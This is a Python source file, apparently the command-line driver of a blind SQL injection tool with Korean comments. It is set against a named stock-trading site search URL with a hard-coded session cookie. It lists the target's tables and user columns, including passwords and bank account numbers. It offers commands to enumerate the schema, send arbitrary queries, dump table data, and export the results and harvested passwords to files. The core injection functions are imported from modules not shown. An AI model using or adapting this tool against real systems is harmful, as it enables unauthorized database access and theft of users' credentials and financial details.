from attack_setting import attackData,tableInfo
from attack_query import *
from get_infos import *


#공격 대상 URL 및 초기 쿠키 설정 
url = "https://www.rookiestock.com/search"
cookies = {
    "JSESSIONID":"08A0E4467B33F693DBB9EBA3CC6D90D2"
}


attack_query = ''
page = attackData()
#query = attackQuerys()
page.set_url(url)
page.set_cookies(cookies)

result = tableInfo()

table_list=['Users','Board', 'Community', 'Notice', 'OrderStockHistory', 'Stock', 'StockHistory', 'Stock_Price', 'Transaction', 'Transfer_history', 'UserStock', 'file', 'notice', 'stock_index', 'user']
for t in table_list:
    result.append_table(t)

user_column_list = ['USER_ID','USER_PW','ACCESS_LEVEL','USER_NM','USER_AGENCY','USER_TELNO','USER_BIRTH','USER_BANK','USER_ACCOUNT_NUMBER','ACCOUNT_BALANCE']
for c in user_column_list:
    result.append_column('Users',c)


#쿼리 설정 및 요청 보내기(POST)
#print(page.send_post_request())

#기본 설정 보기 
#page.show


state=""
while(state != 'q'):

   
    ascii_art = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⡿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⢀⣤⣦⢦⣦⡀⠀⣲⣶⠀⠀⠀⣶⡧⠀⠀⣶⡦⢐⣶⡄ ⣤⣤⠀⠀⢀⣤⡄⠀ ⠰⣶⣷⣵⠂⠀⠠⣤⣤⠀⠀⠀⣤⣄⠀⠀⠀⣀⣤⣴⣤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣯⠀⠂⠀⠁⢺⣿⡂⠀⠠⣿⣟⠀⠈⢽⣿⡂⣿⣿⠂⠺⠟⠿⠿⠻⠇⣿⡯⢘⣿⡅⠀⣽⣿⠀⣠⣿⠟⠀⠀⠀⣠⣥⣬⣤⡀⠀⠨⣿⣿⣧⠀⠀⣿⣯⠀⢀⣾⡿⠋⠀⠁⠋⠃⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣷⠀⠀⠀⠀⣹⣿⡂⠀⠈⣿⣷⠀⠀⣼⣿⠅⢿⣿⡀⢠⣾⠟⢿⣶⠀⣿⣿⣬⣿⠇⠀⣿⣿⣼⣿⠋⠀⠀⠀⠀⠈⣻⣿⡏⠀⠀⠨⣿⡟⣿⣧⠀⣿⡷⠀⣸⣿⡇⠀⠀⡀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠿⠟⠟⣿⣿⠛⠻⠟⠂⠀⠀⠈⠛⠟⠟⠛⠁⠀⣿⣿⡀⢼⣿⠀⢘⣿⡇⣿⡯⢙⣿⡇⠀⣻⣿⡟⢻⣿⡆⠀⠀⠀⢀⣿⣿⡧⠀⠀⠨⣿⡧⠈⣿⣧⣿⣟⠀⢸⣿⡇⠀⠘⠛⣿⣟⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡀⠀⣿⣿⡀⢀⠀⢀⠀⣠⣠⣠⣠⣄⣤⣤⣢⣿⣿⠀⠘⣿⣥⣼⡿⠁⣿⣟⢨⣿⡆⠀⣿⣿⠀⠀⢹⣿⣆⠀⢀⣼⣿⣿⣿⣆⠀⠨⣿⡗⠀⠈⣿⣿⣯⠀⠈⢿⣷⣄⠀⡀⣿⡯⠀⠀⠀
⠀⠀⠀⠈⠟⠟⠟⠟⠟⠟⠟⠟⠟⠟ ⠈⠋⠉⠉⠉⠁⠁ ⣿⣿⠁⠀⠀⠈⠈⠀⠀⣿⡗⢘⣿⡅ ⠛⠛⠀⠀⠀⠙⠟⠂⠸⠿⠿⠿⠿⠻⠀⠘⠛⠃⠀⠀⠘⠛⠓⠀⠀⠀⠙⠛⠟⠟⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    print(ascii_art)
    print("\nBlind SQL Injection Script")
    # print("\n기능 목록")
    # print('='*25)
    # print("1. 사이트 URL 설정")
    # print("2. 사이트 SessionID 설정")
    # print("3. 공격대상 설정 보기")

    # print('-'*23)
    # print("4. 쿼리 요청")
    # print("5. 테이블 탐색")
    # print("6. 컬럼 탐색")
    # print("7. 테이블 내 데이터 탐색")

    # print('-'*23)
    # print("8. 테이블 정보 출력")
    # print("9. 컬럼 정보 출력")
    # print("10. 데이터 정보 출력")
    # print("11. 데이터 내보내기(.xlsx)")
    # print('='*25)

    user_input = input()

    match user_input:
        case 'set_url': #사이트 URL 설정 
            print(f"현재 URL : {page.base_url}") 
            if input("새로운 url로 변경하시겠습니까? [y/n] : ")=='y':
                page.set_url(input("새로운 url 입력 : ")) 
                
                
        case 'set_sessionid': #SESSIONID 설정
            print(f"현재 SESSIONID : {page.cookies['JSESSIONID']}") 
            if input("SessionID를 새로 설정하시겠습니까? [y/n] : ")=='y':
                page.set_sessionID(input("새로운 SessionID 입력 : ")) 
                
                
        case 'show_settings': #공격 대상 설정 보기
            page.show()


        case 'send_query': #쿼리 실행
            user_query = input("공격 대상 사이트에 실행할 쿼리(전체 검색어)를 입력 : ")
            print(f"처리 결과 : {page.send_post_request(user_query)}")

        case 'get table': #테이블 가져오기
            page.show()
            if input("\n현재 설정으로 테이블 탐색 시작[y/n] : ")=='y':
                tables = getData.get_tables(page)
        
        case 'get column': #컬럼 정보 가져오기 
            page.show()
            result.show_tables()
            user_table = input("\ntable name? ")
            if user_table=='All':
                print("\n모든 테이블의 컬럼을 탐색")
                for table in result.tables:
                    getData.get_columns(page,result,table)
            elif user_table in result.tables:
                getData.get_columns(page,result,user_table)
            else:
                print("테이블 목록에 있는 테이블을 입력해주세요. ")
        
        case 'get data': #테이블 내 데이터 정보 가져오기
            #page.show()
            result.show_tables()
            user_table = input("\ntable name? ")
            if user_table=='All':
                print("\n모든 테이블의 데이터를 탐색")
                for table in result.tables:
                    getData.get_datas(page,result,table)
            elif len(result.columns[user_table])!=0:
                getData.get_datas(page,result,user_table)
            else:
                print("해당 테이블의 컬럼 탐색을 먼저 진행해주세요. ")
        
        case 'show_tables':
            result.show_tables()

        case 'show_columns':
            print()
            result.show_columns()

        case 'show_data':
            result.show_tables()
            user_table = input("데이터 출력을 원하는 테이블을 지정해주세요. ")
            result.show_data(user_table)
        
        case 'export_table':
           result.export_data_xlsx()
           print("output.xlsx file created")

        case 'export_passwd':
           result.export_passwd()
           print("passwd.txt file created")

        case 'get_db rookie':
            page.show()
            if input("\ncontinue? [y/n] : ")=='y':
                result = getData.get_tables(page)
                print("")
                result.show_tables()
                user_table = input("\ntable name? ")
                if user_table in result.tables:
                    getData.get_columns(page,result,user_table)
                    getData.get_datas(page,result,user_table)
                    print("Injection completed")

                    result.export_data_xlsx()
                    print("output.xlsx file created")

                    result.export_passwd()
                    print("passwd.txt file created")

                else:
                    print("Invalid table name")



        case _: 
            print("존재하지 않는 명령어")
        
    state= input("\n계속 실행을 원하시면 엔터를 눌러주세요... (exit=q)")

print("프로그램 종료")